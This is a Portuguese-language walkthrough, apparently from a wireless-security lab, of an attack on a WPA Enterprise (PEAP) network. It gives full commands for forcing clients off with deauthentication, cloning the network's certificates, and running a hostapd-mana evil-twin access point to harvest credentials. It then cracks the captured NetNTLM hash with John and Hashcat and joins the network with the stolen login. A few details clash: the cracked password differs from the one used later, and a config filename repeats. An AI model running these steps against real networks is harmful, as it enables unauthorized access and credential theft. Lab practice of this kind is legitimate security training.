# WPA Enterprise

## Verificar interfaces de rede wi-fi
### Mostra quais interfaces de rede sem fio estão disponíveis e seu estado atual
```
iwconfig
```
## Matar processos indesejáveis
Finaliza processos que podem atrapalhar o modo monitor (como NetworkManager, wpa_supplicant).
```
sudo airmon-ng check kill
```
## Iniciar modo monitor na interface wlan0
### Coloca a interface wlan0 em modo monitor, criando geralmente wlan0mon.
Esse modo permite capturar pacotes sem estar associado a uma rede.
```
sudo airmon-ng start wlan0
```
## Verificar interfaces de rede wi-fi
### Mostra quais interfaces de rede sem fio estão disponíveis e seu estado atual
```
iwconfig
```
## Escaneia todas as bandas (2.4 GHz e 5 GHz) para listar redes disponíveis.
### Lista todas as redes Wi‑Fi próximas, mostrando SSID, BSSID, canal, tipo de criptografia e clientes conectados.
```
sudo airodump-ng --band abg wlan0mon
```
## Foca na rede corporativa alvo (canal 44, BSSID específico), salvando pacotes em formato .pcap.
```
sudo airodump-ng -c 44 --bssid F0:9F:C2:71:22:15 wlan0mon -w peap_recon --output-format pcap
```
## Envia pacotes de deauth para forçar clientes a se reconectarem, gerando tráfego EAP/PEAP.
```
sudo aireplay-ng -0 10 -a F0:9F:C2:71:22:15 wlan0mon
```
## Analisa o tráfego capturado e extrai certificados usados no handshake TLS da rede corporativa.
```
tshark -r peap_recon-01.cap -Y "wlan.bssid == F0:9F:C2:71:22:15 && eap && tls.handshake.certificate" -V
```
## O grep filtra campos de interesse.
```
tshark -r peap_recon-01.cap -Y "wlan.bssid == F0:9F:C2:71:22:15 && eap && tls.handshake.certificate" -V | grep -E "issuer:|subject:|id-at-countryName|id-at-stateOrProvinceName|id-at-localityName|id-at-organizationName|id-at-organizationalUnitName|id-at-commonName|pkcs-9-at-emailAddress"
```
## Instalação e configuração do FreeRADIUS com certificados falsos (ca.cnf, server.cnf).
```
sudo apt install freeradius
```
```
sudo nano /etc/freeradius/3.0/certs/ca.cnf
```
```
[certificate_authority]
countryName = ES  
stateOrProvinceName = Madrid  
localityName = Madrid  
organizationName = WiFiChallenge  
emailAddress = ca@WiFiChallenge.com  
commonName = "WiFiChallenge CA"
```
```
sudo nano /etc/freeradius/3.0/certs/ca.cnf
```
```
[server]
countryName = ES  
stateOrProvinceName = Madrid  
localityName = Madrid  
organizationName = WiFiChallenge  
emailAddress = server@WiFiChallenge.com  
commonName = "WiFiChallenge CA"
```
## Criação de arquivo mana.eap_user para aceitar múltiplos métodos EAP e registrar credenciais.
```
cat << EOF > /tmp/mana.eap_user
* PEAP,TTLS,TLS,FAST
"t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]
EOF
```
## Elevação de privilégios para root
```
sudo su
```
## Acessa o doretório de certs
```
cd /etc/freeradius/3.0/certs
```
## Apaga parâmetros Diffie‑Hellman
```
rm dh
```
## Geração de parâmetros Diffie‑Hellman (openssl dhparam).
```
openssl dhparam -out dh -2 2048
```
## Tenta fazer o build
```
make
```
## Apaga arquivos para posterior criação
```
rm -f *.pem *.der *.csr *.crt *.key *.p12 *.req
```
## Tenta fazer o build novamente
```
make
```
## Arquivo network.conf define um hostapd-mana (Evil Twin AP) simulando a rede corporativa wifi-corp.
```
cat /tmp/network.conf
```
```
interface=wlan3
driver=nl80211
ssid=wifi-corp
hw_mode=a
channel=44

auth_algs=1
wmm_enabled=1
ieee80211n=1

ieee8021x=1
eap_server=1
eap_user_file=/tmp/mana.eap_user

ca_cert=/etc/freeradius/3.0/certs/ca.pem
server_cert=/etc/freeradius/3.0/certs/server.pem
private_key=/etc/freeradius/3.0/certs/server.key
private_key_passwd=whatever
dh_file=/etc/freeradius/3.0/certs/dh

wpa=2
wpa_key_mgmt=WPA-EAP
rsn_pairwise=CCMP

mana_wpe=1
mana_credout=/tmp/hostapd.credout
```
## Desativa e ativa novamente a interface wlan0
```
sudo ifconfig wlan0 down && sudo ifconfig wlan0 up
```
## Levanta o AP falso, que coleta credenciais enviadas pelos clientes.
```
sudo hostapd-mana /tmp/network.conf
```
## Ativa o modo monitor na interface wlan2
```
sudo airmon-ng start wlan2
```
## Monitora rede corporativa alvo.
```
sudo airodump-ng wlan2mon -c 44
```
## Cria o arquivo com a conf do John
```
cat john-juan
```
Saída
```
juan.tr:$NETNTLM$01f5440475aa98b5$f67a6fd6f701a2872eacf42f858af967b6b2826941650efc:::::::
```
## Quebra o hash com o John
```
john --wordlist=/usr/share/wordlists/rockyou.txt john-juan
```
## Cria o arquivo com a conf do Hashcat
```
cat hashcat-juan
```
Saída
```
juan.tr::::f67a6fd6f701a2872eacf42f858af967b6b2826941650efc:01f5440475aa98b5
```
## Quebra o hash com o Hashcat
```
hashcat -m 5500 hashcat-juan /usr/share/wordlists/rockyou.txt
```
## Credenciais obtidas
```
juan.tr:bulldogs123
```
## Arquivo client.conf configurado para WPA‑EAP (PEAP/MSCHAPv2) com identidade e senha capturada.
```
network={
    ssid="wifi-corp"
    scan_ssid=1
    key_mgmt=WPA-EAP
    eap=PEAP
    identity="CONTOSO\juan.tr" # Replace with captured identity
    password="bulldogs1234"    # Replace with cracked password
    phase1="peaplabel=0"
    phase2="auth=MSCHAPV2"
}
```
## Conecta à rede corporativa usando as credenciais roubadas.
```
sudo wpa_supplicant -i wlan4 -c client.conf
```
## Obtém IP via DHCP, garantindo acesso total.
```
sudo dhclient wlan4 -v
```














